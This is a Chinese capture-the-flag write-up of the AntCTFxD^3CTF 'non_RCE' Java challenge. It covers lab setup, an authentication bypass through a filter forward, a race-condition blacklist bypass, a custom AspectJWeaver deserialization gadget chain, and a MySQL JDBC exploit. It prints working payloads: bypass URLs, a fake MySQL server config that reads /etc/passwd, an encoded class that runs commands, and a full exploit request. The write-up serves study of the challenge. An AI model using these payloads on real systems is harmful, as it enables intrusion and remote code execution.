# 非攻——non RCE 题目分析

阅读量 **212911**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-02 14:30:17

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t016b6b02f376ccb37a.jpg)

最近在恶补反序列化的知识点，mysql
jdbc反序列化漏洞也是一个比较经典的漏洞。学习的过程中正好发现AntCTFxD^3CTF有道赛题把这个知识点出成了题目，为了了解该jdbc漏洞的利用场景，周末把环境和docker容器搭起来进行漏洞复现。同时将这道题目的知识点分模块进行学习，主要介绍环境构建、漏洞分析以及编写利用。

## 0x01 题目简介

访问首页如下图所示

![](https://static.zhishibox.net/20211023/18e9c2b2-3f4f-4900-b418-c31ce422a31e_103663500.png)

题目类型为源代码审计，主要考察以下几点

1.认证绕过  
2.黑名单绕过  
3.Mysql JDBC反序列化利用  
4.AspectJWeaver利用链构造

师傅们对本题的知识点讲解的非常透彻，有些知识点就不过多分析，因为是学习Mysql JDBC的反序列化利用姿势，所以3，4知识点将做非常详细的讲解。

## 0x02 环境搭建

老规矩，还是先从环境搭建开始。本次环境搭建涉及到两种搭建模式，一是本地直接在IDEA中执行；二是使用docker将服务集成化部署。

###  0x1 本地部署

访问该链接<https://github.com/Ant-FG-Lab/non_RCE> ，下载

项目并做如下修改  
修改pom.xml中tomcat-embed-core的对应版本为8.5.70

![](https://p5.ssl.qhimg.com/t0124dfc98ac6312ab4.png)

同时设置JDK8版本的Java 环境，使用maven下载pom.xml中的依赖库即可。  
找到src/main/java/launch/Main.java 运行该项目

###  0x2 docker部署

docker 涉及到编译打包操作，具体方法如下：

**1\. 编译**

右键项目打开项目配置，填写相关信息并选择编译类型为JAR

![](https://p1.ssl.qhimg.com/t01d6782f2822870f60.png)

选择Build Aritfacts，编译项目并生成simple-embedded-tomcat-webapp.jar，之后部署在Docker容器中

![](https://p0.ssl.qhimg.com/t0112e9c60e8a38d312.png)

**2\. 搭建Docker环境**

首先是基础的Java环境，利用之前的研究基础直接构建

    
    
    git clone https://github.com/BabyTeam1024/Docker_JDK.git
    cd Docker_JDK
    ./JdkDockerBuild.sh
    docker-compose up -d 
    docker exec -it testjava_jdk_1 bash
    

**3\. 部署服务**

这里是自动化部署的重点，在命令启动项目，我们不能直接运行编译好的simple-embedded-tomcat-webapp.jar。因为在launch/Main.java代码中写死了项目的加载路径，所以我们需要在jar包对应的目录中做一些操作。主要影响代码如下：

![](https://p3.ssl.qhimg.com/t01677fb317bdc216ba.png)

因此我们需要把编译好的target/Classes放在同一目录中

![](https://p0.ssl.qhimg.com/t01f23fdf89dc0352f6.png)

最后给docker添加启动脚本

    
    
    #!/bin/sh
    cd /root/web
    java -jar simple-embedded-tomcat-webapp.jar
    

制作好的docker获取方式如下

    
    
    docker pull turkeys/non_rce:latest
    

**4\. 开启调试**

修改启动脚本，配置调试选项即可。

    
    
    java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 simple-embedded-tomcat-webapp.jar
    

![](https://p1.ssl.qhimg.com/t01196aac16761cbc4e.png)

在感兴趣的地方下断点就可以逐行调试

![](https://p1.ssl.qhimg.com/t0192896937d5212382.png)

## 0x03 题目解析

拿到题目第一眼看servlet路由关系，以及确定在路由之前所经过的filter。

###  0x1 Servlet 分析

该项目中主要两个Servlet，AdminServlet和HelloServlet  
HelloServlet只是个展示界面，没有实际的功能

​

AdminServlet包含了连接数据库的操作，并且触发路径为/admin/importData

![](https://p5.ssl.qhimg.com/t016503731ea9bf554a.png)

但是需要注意的是/admin/路由被前面的过滤器拦截处理

###  0x2 Filter 分析

包含的过滤器还是很多的

![](https://p3.ssl.qhimg.com/t010c02f84124653137.png)

其中比较重要的是LoginFilter、AntiUrlAttackFilter  
分析LoginFilter代码确定其主要功能是登录认证

    
    
    @WebFilter(
            filterName = "LoginFilter",
            urlPatterns = {"/admin/*"}
    )
    public class LoginFilter implements Filter {
        ...
    String password = req.getParameter("password"); //从http中获取password
    if (password == null) {
        res.sendError( HttpServletResponse.SC_UNAUTHORIZED, "The password can not be null!");
        return;
    }
    try {
        //you can't get this password forever, because the author has forgotten it.
        if (password.equals(PASSWORD)) {//判断密码是否正确
            filterChain.doFilter(servletRequest, servletResponse);
        } else {
            res.sendError(HttpServletResponse.SC_UNAUTHORIZED, "The password is not correct!"); //当密码不匹配时将会报错
        }
    } catch (Exception e) {
        res.sendError( HttpServletResponse.SC_BAD_REQUEST, "Oops!");
    }
    }
    

从代码中可以看出我们除了爆破，基本不可能获得正确密码的。这个Filter先放这，我们回头分析。

* * *

AntiUrlAttackFilter 这个Filter很奇怪，他过滤了一些字符并替换成了空，这就很有意思。他的作用路径是/*这就意味着会处理所有请求。

![](https://p5.ssl.qhimg.com/t01bc2f868d7a308743.png)

###  0x3 Checker分析

Checker中存放了两个类，BlackListChecker和DataMap

![](https://p3.ssl.qhimg.com/t01efe7e7c8b5ebb480.png)

打眼一看DataMap好像没什么用，而BlackListChecker则把jdbc字符串放入了黑名单。有意思的是BlackListChecker是个单例，这就意味如果处理不好就会出现条件竞争漏洞。至于为什么是单例，可以看看下面的代码

    
    
    public static BlackListChecker getBlackListChecker() {
        if (blackListChecker == null){//判断该类是否已经实例化
            blackListChecker = new BlackListChecker();
        }
        return blackListChecker;
    }
    

###  0x4 pom.xml 分析

pom.xml 是maven项目的主要依赖文件，其中会存放项目的依赖库以及版本，可通过maven自动下载和添加依赖。主要包含以下内容

    
    
      <properties>
        <tomcat.version>8.5.70</tomcat.version>
        <mysql.connector.version>5.1.26</mysql.connector.version>
        <aspectjweaver.version>1.9.2</aspectjweaver.version>
      </properties>
    

## 0x04 解题思路

看完代码及配置文件后首先想到的是利用JDBC触发反序列化漏洞，并通过aspectjweaver利用链写入文件，配合其他姿势实现命令执行，一开始只能想到这。

那么如果要实现这一目的，会存在哪些难题？  
首先是/admin路由会经过LoginFilter，之后BlackListChecker会检测jdbcUrl，并且项目中没有commons-collections:3.2.2 jar包，将任意文件写变成代码执行，主要是这四个难题，总结如下：

  * 绕过认证
  * 绕过jdbcUrl检测
  * 构造aspectjweaver利用链
  * 将任意文件写变成代码执行

###  0x1 认证绕过

还要从Filter说起，上一节说到AntiUrlAttackFilter 过滤了一些字符并替换成了空，相关逻辑如下

    
    
    if (url.contains("../") && url.contains("..") && url.contains("//")) {
        res.sendError(HttpServletResponse.SC_BAD_REQUEST, "The '.' & '/' is not allowed in the url");
    } else if (url.contains("\20")) {
        res.sendError(HttpServletResponse.SC_BAD_REQUEST, "The empty value is not allowed in the url.");
    } else if (url.contains("\\")) {
        res.sendError(HttpServletResponse.SC_BAD_REQUEST, "The '\\' is not allowed in the url.");
    } else if (url.contains("./")) {
        String filteredUrl = url.replaceAll("./", "");
        req.getRequestDispatcher(filteredUrl).forward(servletRequest, servletResponse);
    } else if (url.contains(";")) {
        String filteredUrl = url.replaceAll(";", "");
        req.getRequestDispatcher(filteredUrl).forward(servletRequest, servletResponse);
    } else {
        filterChain.doFilter(servletRequest, servletResponse);
    }
    

前几个过滤之后就抛异常退出了，只有后两个过滤会继续执行路由处理，处理的方式是forward。Filter调用顺序如下，LoginFilter在AntiUrlAttackFilter之后。

![](https://p5.ssl.qhimg.com/t016f28862ffb4fcc85.png)

一句话概括，该漏洞点在于默认的[@WebFilter](https://github.com/WebFilter
"@WebFilter")只会处理REQUEST请求，然而经过AntiUrlAttackFilter处理之后请求类型就变成了FORWARD，所以LoginFilter就不处理了直接就到Servlet。

![](https://p0.ssl.qhimg.com/t01693fdd82a6dc7ba7.png)

至于发什么包，可通过代码进行分析，因为将 ./ 和 ;替换为空因此有以下组合

    
    
    /admin/importData;/?jdbcUrl=x&databaseType=mysql
    /admin.//importData/?jdbcUrl=x&databaseType=mysql
    

###  0x2 黑名单绕过

前面在题目解析的时候提过思路，因为BlackListChecker是单例模式在过滤的时候很容易发生条件竞争，将要过滤的变量修改成合法字符串从而绕过过滤。再次回顾检测机制，主要有以下代码

    
    
    public String[] blackList = new String[] {"%", "autoDeserialize"};//黑名单内容
    
    public static boolean check(String s) {
        BlackListChecker blackListChecker = getBlackListChecker();
        blackListChecker.setToBeChecked(s);//设置检测字符串
        return blackListChecker.doCheck();
    }
    

如果在doCheck之前可以把发送的恶意toBeChecked字符串替换掉，就能实现黑名单绕过，可以采用burpsuit或python双线程发包的方式，实现条件竞争，这里就不过多描述了。可以先把这部分检测注释掉分析下面的逻辑，如下图所示

![](https://p2.ssl.qhimg.com/t012da4ae18cce1a34a.png)

###  0x3 利用链构造

因为使用的是Mysql JDBC反序列化，这部分内容分为触发和利用两大环节。对于此题来讲，我们只分析利用这部分内容，关于如何使用Mysql
JDBC连接触发反序列化，之后将单独开设专题进行讲解。关于利用部分的详细分析如下：

该题目中使用了aspectjweaver依赖包，在ysoserial中有相关的利用链，具体的调用栈和构造过程都比较详细，主要功能是实现文件写。

    
    
    HashSet.readObject()
        HashMap.put()
            HashMap.hash()
                TiedMapEntry.hashCode()
                    TiedMapEntry.getValue()
                        LazyMap.get()
                            SimpleCache$StorableCachingMap.put()
                                SimpleCache$StorableCachingMap.writeToPath()
                                    FileOutputStream.write()
    

主要的问题在于该利用链使用了commons-collections:3.2.2，然而项目中并不存在这部分代码。笔者先是梳理了该利用链，具体细节可见 。

![](https://p3.ssl.qhimg.com/t014cbc19f2cfcabd65.png)

简单来讲上图中先分析橙色的调用链，从HashSet的readObject方法出发，通过对象间方法的调用间接调用到StoreableCachingMap的writeTopath方法。图中红色部分是对象及参数的传递关系，可以很清楚的看到在反序列化触发时的利用链调用过程。从而可以方便的分析出图中绿色部分的构造方法和构造顺序。

根据分析判断，TiedMapEntry和LazyMap一个负责hashCode方法向get方法转换，另一个负责get方法向put方法转换。我们需要在项目中找到类似功能的函数，替换commons-collections:3.2.2依赖库。

我们的目的是找到几个类中的函数最后能够形成将key的hashCode方法转成map的put方法且参数能够对应上，就算完成任务。在项目中搜索hashCode方法，结果都是DataMap中的类，笔者又细细的分析了下，感觉有戏。

![](https://p2.ssl.qhimg.com/t01fc8eb86cf0d5be81.png)

找到如下调用链正好满足上面的需求

![](https://p1.ssl.qhimg.com/t01fadf939311a68572.png)

参数的调用过程如下图所示

![](https://p1.ssl.qhimg.com/t018b397edf901d6816.png)

调整过后的利用链需要注意几点，FileContent内容存放在创建DataMap的Map参数中。

    
    
    HashMap wrapperMap = new HashMap();
    wrapperMap.put(filename,content);
    DataMap dataMap = new DataMap(wrapperMap,(Map)simpleCache);
    

Filename则是Entry类的创建参数key

    
    
    Constructor dataMapEntryConstructor = Reflections.getFirstCtor("checker.DataMap$Entry");
    Reflections.setAccessible(dataMapEntryConstructor);
    Object dataMapEntry = dataMapEntryConstructor.newInstance(dataMap,filename);
    

完整的代码在最后一部分进行整合。

###  0x4 实现命令执行

上传文件并不是我们的最终目的，命令执行才是。那么怎么做到命令执行呢？答案是依靠反序列化中的Class.forName（详情参考<https://www.anquanke.com/post/id/245458#h3-7>），原理就是Java在反序列化的时候会执行Class.forName从文件中加载字节码到内存，这时候会触发要反序列化类的静态代码块也就是类中static声明的地方。

如果我们在服务器上写入类似的代码，那么在执行Class.forName的时候就会执行静态代码块。

    
    
    package servlet;
    import java.io.IOException;
    import java.io.Serializable;
    public class ant implements Serializable{
        static {
            try {
                Runtime.getRuntime().exec("calc.exe");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        public ant(){
    
        }
    }
    

我们参考readobject代码逻辑，在resovleClass函数中会对加载反序列化类。

![](https://p3.ssl.qhimg.com/t0149810aca6b92e1c2.png)

相关代码如下，红色部分为主要逻辑

![](https://p3.ssl.qhimg.com/t01d59caa80f40030b7.png)

下面对整个题目的利用做个梳理。

## 0x05 如何利用

###  0x1 修改ysoserial

在ysoserial工具中添加NonRce.java代码，完整代码 <https://github.com/BabyTeam1024/NonRce.git>

使用编译指令重新编译ysoserial jar包，并测试新增代码是否编译成功

    
    
    mvn clean package -DskipTests
    java -jar ysoserial-0.0.6-SNAPSHOT-all.jar NonRce "ahi.txt;YWhpaGloaQ=="
    

###  0x2 启动MysqlFakeServer

Mysql JDBC 反序列化主要使用 <https://github.com/fnmsd/MySQL_Fake_Server>，

    
    
    {
        "config":{
            "ysoserialPath":"/tmp/ysoserial-0.0.6-SNAPSHOT-all.jar",//配置ysoserial路径
            "javaBinPath":"java",
            "fileOutputDir":"./fileOutput/",
            "displayFileContentOnScreen":true,
            "saveToFile":true
        },
        "fileread":{
            "linux_passwd":"/etc/passwd",
            "linux_hosts":"/etc/hosts",
            "index_php":"index.php",
            "ssrf":"https://www.baidu.com/",
            "__defaultFiles":["/etc/hosts","c:\\windows\\system32\\drivers\\etc\\hosts"]
        },
        "yso":{
            "NonRce":["NonRce","./target/classes/servlet/ant.java;cGFja2FnZSBzZXJ2bGV0OwppbXBvcnQgamF2YS5pby5TZXJpYWxpemFibGU7CnB1YmxpYyBjbGFzcyBhbnQgaW1wbGVtZW50cyBTZXJpYWxpemFibGV7CiAgICBzdGF0aWMgewogICAgICAgIFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoInRvdWNoIC90bXAvYW50LWN0ZiIpOwogICAgfQogICAgcHVibGljIFN0cmluZyBhOwogICAgcHVibGljIGFudCgpewogICAgICAgIGEgPSAiYSI7CiAgICB9Cn0="]
        }
    }
    

直接启动即可

    
    
    python3 server.py
    

###  0x3 写文件

将文件写到项目servlet目录中，/target/classes/servlet/，可以先使用javac命令将源码编译好后用base64编码文件。但是要注意特殊字符需要二次url编码，这是个坑，举个例子文件base64编码后为，其中有几处为+，需要先编码为url编码格式后再整体进行url编码。

    
    
    yv66vgAAADQAKAoACgAXCAAMCQAJABgKABkAGggAGwoAGQAcBwAdCgAHAB4HAB8HACAHACEBAAFhAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAHQEAClNvdXJjZUZpbGUBAAhhbnQuamF2YQwADgAPDAAMAA0HACIMACMAJAEACGNhbGMuZXhlDAAlACYBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAnAA8BAAtzZXJ2bGV0L2FudAEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAJAAoAAQALAAEAAQAMAA0AAAACAAEADgAPAAEAEAAAACsAAgABAAAACyq3AAEqEgK1AAOxAAAAAQARAAAADgADAAAADQAEAA4ACgAPAAgAEgAPAAEAEAAAAE8AAgABAAAAErgABBIFtgAGV6cACEsqtgAIsQABAAAACQAMAAcAAgARAAAAFgAFAAAABwAJAAoADAAIAA0ACQARAAsAEwAAAAcAAkwHABQEAAEAFQAAAAIAFg==
    

二次编码后为

    
    
    http://192.168.0.115:8080/admin/importData;/?databaseType=mysql&jdbcUrl=jdbc%3amysql%3a//192.168.0.213%3a3306/test%3fdetectCustomCollations%3dtrue%26autoDeserialize%3dtrue%26user%3dyso_NonRce_./target/classes/servlet/ant.class%3byv66vgAAADQAKAoACgAXCAAMCQAJABgKABkAGggAGwoAGQAcBwAdCgAHAB4HAB8HACAHACEBAAFhAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ%25%32%62AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ%25%32%62AQANU3RhY2tNYXBUYWJsZQcAHQEAClNvdXJjZUZpbGUBAAhhbnQuamF2YQwADgAPDAAMAA0HACIMACMAJAEACGNhbGMuZXhlDAAlACYBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAnAA8BAAtzZXJ2bGV0L2FudAEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAJAAoAAQALAAEAAQAMAA0AAAACAAEADgAPAAEAEAAAACsAAgABAAAACyq3AAEqEgK1AAOxAAAAAQARAAAADgADAAAADQAEAA4ACgAPAAgAEgAPAAEAEAAAAE8AAgABAAAAErgABBIFtgAGV6cACEsqtgAIsQABAAAACQAMAAcAAgARAAAAFgAFAAAABwAJAAoADAAIAA0ACQARAAsAEwAAAAcAAkwHABQEAAEAFQAAAAIAFg%25%33%64%25%33%64
    

###  0x4 触发命令执行

触发命令的方法之前也介绍过了，只要反序列化了ant类就能触发静态代码，那么这个代码就相对好写了，只需注释ant.java中下述代码以上的部分，再次编译发送第三步写文件的数据包即可触发

    
    
    Constructor dataMapEntryConstructor = Reflections.getFirstCtor("servlet.ant");
    Reflections.setAccessible(dataMapEntryConstructor);
    Object dataMapEntry = dataMapEntryConstructor.newInstance();
    

![](https://p3.ssl.qhimg.com/t01debeca026e86f5df.png)

## 0x6 总结

这道题目涉及到的知识点非常多，需要逐个拆解进行分析学习。笔者分析了这个题中最重要的两个部分反序列化文件上传以及如何进行命令执行，也有一些知识之前分析过，当然还有之后的Mysql
JDBC反序列化漏洞的原理篇。笔者将继续启程，分析总结更多的关于Java反序列化的漏洞以及题目。

## 参考链接

<http://w4nder.top/?p=407#non_RCE>  
<https://github.com/fnmsd/MySQL_Fake_Server>  
<https://meizjm3i.github.io/2021/03/07/Servlet%E4%B8%AD%E7%9A%84%E6%97%B6%E9%97%B4%E7%AB%9E%E4%BA%89%E4%BB%A5%E5%8F%8AAsjpectJWeaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadget%E6%9E%84%E9%80%A0-AntCTFxD-3CTF-non-RCE%E9%A2%98%E8%A7%A3/>  
<https://www.cnblogs.com/sijidou/p/14631154.html>  
<https://mp.weixin.qq.com/s/yQ-00YaykUe41S0DdlgoiQ>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **D4ck** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/256974](/post/id/256974)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [反序列化](/tag/反序列化)
  * [jdbc](/tag/jdbc)

 **+1** __0赞

 __收藏

![](https://p2.ssl.qhimg.com/t018452be330c01b353.png) D4ck

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

